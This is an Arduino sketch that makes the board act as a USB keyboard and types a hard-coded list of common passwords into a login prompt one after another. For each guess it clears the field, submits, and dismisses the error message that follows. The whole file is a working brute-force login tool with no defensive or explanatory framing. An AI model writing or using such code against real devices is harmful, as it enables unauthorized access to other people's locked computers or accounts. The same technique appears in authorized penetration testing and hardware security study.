#include <Keyboard.h>

// ---------- PASSWORDS TO TRY ----------
const char* PASSWORDS[] = {
  "iloveyou",
  "admin",
  "password",
  "1213"
};
const int PASSWORD_COUNT = sizeof(PASSWORDS) / sizeof(PASSWORDS[0]);
const unsigned long TYPE_DELAY       = 120;   
const unsigned long PRE_SUBMIT_DELAY = 200;   
const unsigned long ERROR_WAIT       = 3000;  
const unsigned long OK_PRESS_DELAY   = 200;   
const unsigned long AFTER_OK_WAIT    = 3000;  

void setup() {
  delay(3000);                
  Keyboard.begin();

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);

  clearField(20);

  for (int i = 0; i < PASSWORD_COUNT; i++) {
    tryPassword(PASSWORDS[i]);
  }

  Keyboard.end();
}

void loop() {}

void tryPassword(const char *pw) {
  clearField(20);
  for (int i = 0; pw[i] != '\0'; i++) {
    Keyboard.print(pw[i]);
    delay(TYPE_DELAY);
  }

  delay(PRE_SUBMIT_DELAY);

  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(ERROR_WAIT);

  Keyboard.press(KEY_RETURN);
  delay(OK_PRESS_DELAY);
  Keyboard.releaseAll();

  delay(AFTER_OK_WAIT);
}

void clearField(int times) {
  for (int i = 0; i < times; i++) {
    Keyboard.press(KEY_BACKSPACE);
    delay(60);
    Keyboard.releaseAll();
    delay(60);
  }
}
